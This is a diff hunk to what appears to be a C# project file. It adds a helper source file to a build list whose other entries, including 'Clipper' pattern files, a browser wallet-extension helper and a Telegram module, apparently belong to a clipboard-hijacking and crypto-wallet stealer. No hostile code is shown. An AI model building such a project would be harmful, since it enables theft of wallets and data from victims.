@@ -97,6 +97,7 @@
     <Compile Include="Clipper\EventManager.cs" />
     <Compile Include="Clipper\Patterns.cs" />
     <Compile Include="Config.cs" />
+    <Compile Include="Helpers\ResourceManager.cs" />
     <Compile Include="Helpers\ZipManager.cs" />
     <Compile Include="Target\Browsers\BrowserWalletExtensionsHelper.cs" />
     <Compile Include="Telegram.cs" />
